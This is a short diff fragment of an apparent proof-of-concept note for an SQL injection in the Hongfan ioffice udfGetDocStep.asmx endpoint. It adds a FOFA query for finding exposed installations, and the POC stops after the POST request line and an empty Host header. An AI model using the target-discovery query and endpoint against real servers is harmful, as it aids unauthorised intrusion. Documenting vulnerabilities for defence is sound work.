@@ -1,6 +1,13 @@
 ## 红帆ioffice-udfGetDocStep.asmx存在SQL注入漏洞
 
+## fofa
+
+```
+app="红帆-ioffice"
+```
+
 ## POC
+
 ```
 POST /ioffice/prg/interface/udfGetDocStep.asmx HTTP/1.1
 Host: 
